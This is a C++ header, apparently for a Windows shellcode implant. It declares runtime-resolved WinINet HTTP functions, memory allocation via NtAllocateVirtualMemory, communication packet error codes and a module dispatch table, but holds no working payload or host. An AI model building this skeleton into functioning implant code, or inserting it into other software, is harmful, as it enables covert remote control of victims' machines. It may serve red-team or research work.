#pragma once

#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <objbase.h>
#include <iostream>
#include <wininet.h>
#include "shared_func.hpp"
#include "logger.hpp"

#ifndef SH_LOG_FILE
#error "shellcode.hpp must have SH_LOG_FILE set at compile time"
#endif

typedef LONG NTSTATUS;


#define MAX_ARG_COUNT 2
enum { MAX_MODULES = 64 };

#define FAIL_GET_NTDLL 0x50000
#define FAIL_GET_KERNEL32 0x50001

#define FAIL_LOAD_USER32 0x50002
#define FAIL_LOAD_MSVCRT 0x50003
#define FAIL_LOAD_WININET 0x50004
#define FAIL_GET_LOADLIBRARYW 0x50005


#define FAIL_GET_SPRINTF 0x55006
#define FAIL_GET_MALLOC 0x55007
#define FAIL_GET_REALLOC 0x55008
#define FAIL_GET_FREE 0x55009
#define FAIL_GET_SLEEP 0x5500A
#define FAIL_GET_INTERNETOPEN 0x5500B
#define FAIL_GET_INTERNETREADFILE 0x5500D
#define FAIL_GET_INTERNETCLOSEHANDLE 0x5500E
#define FAIL_GET_INTERNETQUERYDATAAVAILABLE 0x5500F
#define FAIL_GET_HTTPQUERYINFOW 0x55010
#define FAIL_GET_INTERNETSETOPTIONA 0x55011
#define FAIL_GET_INTERNETQUERYOPTIONA 0x55012
#define FAIL_GET_HTTPOPENREQUESTA 0x55013
#define FAIL_GET_HTTPSENDREQUESTA 0x55014
#define FAIL_GET_INTERNETCONNECTA 0x55015

#define COMMS_READ_FAIL_MALLOC 0x56001
#define COMMS_READ_FAIL_REALLOC 0x56002
#define COMMS_GET_REQUEST_FAIL_MALLOC 0x56003

#define FAIL_GET_NTALLOCATEVIRTUALMEMORY 0x57001
#define FAIL_GET_GETCURRENTPROCESS 0x57002
#define FAIL_GET_MESSAGEBOXA 0x57003

#define COMMS_PACKET_MALFORMED 0x57004
#define COMMS_PACKET_MALFORMED_DATA 0x57005

#define FAIL_AUTO_REGISTER_MODULES 0x99999
#define MODULE_REGISTRATION_FAILED 0x59000
#define MODULE_DISPATCH_FAILED     0x59010

typedef BOOL(WINAPI* WinHttpReceiveResponse_t)(HINTERNET, LPVOID);

extern "C" unsigned int entry();
using shellcode_t = decltype(&entry);

using fsprintf_t = decltype(&sprintf);
using malloc_t = decltype(&malloc);
using realloc_t = decltype(&realloc);
using free_t = decltype(&free);

using InternetOpenA_T = decltype(&InternetOpenA);
using InternetConnectA_T = decltype(&InternetConnectA);
using InternetReadFile_T = decltype(&InternetReadFile);
using InternetCloseHandle_T = decltype(&InternetCloseHandle);
using InternetQueryDataAvailable_T = decltype(&InternetQueryDataAvailable);
using InternetQueryOptionA_T = decltype(&InternetQueryOptionA);
using InternetSetOptionA_T = decltype(&InternetSetOptionA);
using HttpOpenRequestA_T = decltype(&HttpOpenRequestA);
using HttpSendRequestA_T = decltype(&HttpSendRequestA);
using HttpQueryInfoW_T = decltype(&HttpQueryInfoW);
using GetCurrentProcess_T = decltype(&GetCurrentProcess);
using Sleep_T = decltype(&Sleep);
using MessageBoxA_t = decltype(&MessageBoxA);

// Bundle function pointers into one convenient struct
struct func_pointers {
    shared_func_pointers shared_fp;
    fsprintf_t fp_sprintf;
    malloc_t fp_malloc;
    realloc_t fp_realloc;
    free_t fp_free;
    Sleep_T fp_Sleep;
    InternetOpenA_T fp_InternetOpenA;
    InternetConnectA_T fp_InternetConnectA;
    InternetReadFile_T fp_InternetReadFile;
    InternetCloseHandle_T fp_InternetCloseHandle;
    InternetQueryDataAvailable_T fp_InternetQueryDataAvailable;
    InternetSetOptionA_T fp_InternetSetOptionA;
    InternetQueryOptionA_T fp_InternetQueryOptionA;
    HttpOpenRequestA_T fp_HttpOpenRequestA;
    HttpSendRequestA_T fp_HttpSendRequestA;
    HttpQueryInfoW_T fp_HttpQueryInfoW;
    GetCurrentProcess_T fp_GetCurrentProcess;
    MessageBoxA_t fp_MessageBoxA;
};

typedef uint32_t module_id_t;
typedef void (*module_handler_t)(void*, void*, struct logger_ctx*);

typedef struct {
    module_id_t id;
    module_handler_t handler;
    void* context;
} module_entry_t;

struct sh_context {
    struct func_pointers fp;
    struct logger_ctx* log_ctx;
    module_entry_t module_table[MAX_MODULES];
    int moduleCount;
    HINTERNET hInternet;
    HINTERNET hSession;
    HINTERNET hRequest;
    DWORD requestFlags;
    BOOL usingHttps;
};


typedef DWORD (*module_init_func_t)(sh_context* ctx, uint32_t module_id);

typedef struct {
    module_init_func_t func;
    uintptr_t module_id;
} module_descriptor_t;

typedef struct {
    int argc;
    const char* argv[MAX_ARG_COUNT];
    size_t outputSize;
    char* output;
    BOOL outputAlloc; // determines if output was malloc-ed and needs to be freed
} module_context_t;
